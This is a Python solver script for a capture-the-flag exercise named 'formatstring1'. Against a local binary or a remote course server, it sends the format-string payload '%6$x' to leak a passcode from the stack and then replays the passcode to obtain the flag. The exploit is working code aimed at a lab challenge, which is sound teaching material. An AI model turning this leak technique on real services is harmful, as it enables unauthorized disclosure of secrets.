#!/usr/bin/env python3
"""
formatstring1 remote solver

This script automates the exact manual attack:
1) Connect to remote service.
2) Send "%6$x" to leak passcode from stack.
3) Send leaked passcode back at second prompt.
4) Print all server output (including flag on success).
"""

from __future__ import annotations

import argparse
import re
import socket
import subprocess
from pathlib import Path
from typing import Optional


SCRIPT_DIR = Path(__file__).resolve().parent
FORMATSTRING_DIR = SCRIPT_DIR.parent / "formatstring1"
DEFAULT_BINARY = str(FORMATSTRING_DIR / "random-game")
DEFAULT_HOST = "moa6.eecs.utk.edu"
DEFAULT_PORT = 32100
DEFAULT_LEAK_FORMAT = "%6$x"
DEFAULT_FIRST_PROMPT = "passcode to enter here?"
DEFAULT_SECOND_PROMPT = "Again! What's the passcode to enter here?"

HEX_RE = re.compile(r"0x[0-9a-fA-F]+|\b[0-9a-fA-F]{4,}\b")


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    """Read bytes until marker appears (or raise TimeoutError)."""
    sock.settimeout(timeout)
    data = b""

    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk

    if marker not in data:
        raise TimeoutError(f"Did not receive marker: {marker!r}")

    return data


def first_nonempty_line(text: str) -> Optional[str]:
    """Return the first non-empty line from a text block."""
    for line in text.splitlines():
        stripped = line.strip()
        if stripped:
            return stripped
    return None


def first_hex_token(text: str) -> Optional[str]:
    for line in text.splitlines():
        for match in HEX_RE.finditer(line):
            token = match.group(0).strip()
            if token:
                return token
    return None


def build_leak_payload(leak_format: str) -> bytes:
    if not leak_format.endswith("\n"):
        leak_format += "\n"
    return leak_format.encode()


def run_local(
    binary: str, leak_format: str, first_prompt: str, second_prompt: str
) -> None:
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0,
        cwd=str(FORMATSTRING_DIR),
    )

    if proc.stdin is None or proc.stdout is None:
        raise RuntimeError("Failed to open subprocess pipes")

    banner_and_prompt = ""
    while first_prompt not in banner_and_prompt:
        ch = proc.stdout.read(1)
        if ch == "":
            break
        banner_and_prompt += ch

    print(banner_and_prompt, end="")
    proc.stdin.write(build_leak_payload(leak_format).decode())
    proc.stdin.flush()

    leak_and_second_prompt = ""
    while second_prompt not in leak_and_second_prompt:
        ch = proc.stdout.read(1)
        if ch == "":
            break
        leak_and_second_prompt += ch

    print(leak_and_second_prompt, end="")
    leaked = first_hex_token(leak_and_second_prompt) or first_nonempty_line(
        leak_and_second_prompt
    )
    if leaked is None:
        raise RuntimeError("Failed to parse leaked passcode from local output")

    proc.stdin.write(leaked + "\n")
    proc.stdin.flush()

    rest = proc.stdout.read()
    if rest:
        print(rest, end="")

    proc.wait(timeout=3)


def run_remote(
    host: str, port: int, leak_format: str, first_prompt: str, second_prompt: str
) -> None:
    with socket.create_connection((host, port), timeout=5.0) as sock:
        # 1) Wait until the first passcode prompt appears.
        banner_and_prompt = recv_until(sock, first_prompt.encode())
        print(banner_and_prompt.decode(errors="replace"))

        # 2) Send format-string payload to leak stack value.
        sock.sendall(build_leak_payload(leak_format))

        # 3) Read until second prompt. The leak appears before it.
        leak_and_second_prompt = recv_until(sock, second_prompt.encode())
        leak_text = leak_and_second_prompt.decode(errors="replace")
        print(leak_text)

        # Grab first non-empty line as the leaked hex passcode.
        leaked = first_hex_token(leak_text) or first_nonempty_line(leak_text)
        if leaked is None:
            raise RuntimeError("Failed to parse leaked passcode from server response")

        # 4) Send leaked hex value back to satisfy scanf("%x", &yourcode).
        sock.sendall((leaked + "\n").encode())

        # 5) Read remaining output (should include success + flag).
        sock.settimeout(2.0)
        tail = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                tail += chunk
        except TimeoutError:
            # Timeout just means server stopped sending quickly; print what we have.
            pass

        print(tail.decode(errors="replace"))


def main() -> None:
    parser = argparse.ArgumentParser(description="formatstring1 helper")
    parser.add_argument("--mode", choices=["local", "remote"], default="remote")
    parser.add_argument("--binary", default=DEFAULT_BINARY)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--leak-format", default=DEFAULT_LEAK_FORMAT)
    parser.add_argument("--first-prompt", default=DEFAULT_FIRST_PROMPT)
    parser.add_argument("--second-prompt", default=DEFAULT_SECOND_PROMPT)
    args = parser.parse_args()

    if args.mode == "local":
        run_local(args.binary, args.leak_format, args.first_prompt, args.second_prompt)
    else:
        run_remote(
            args.host,
            args.port,
            args.leak_format,
            args.first_prompt,
            args.second_prompt,
        )


if __name__ == "__main__":
    main()
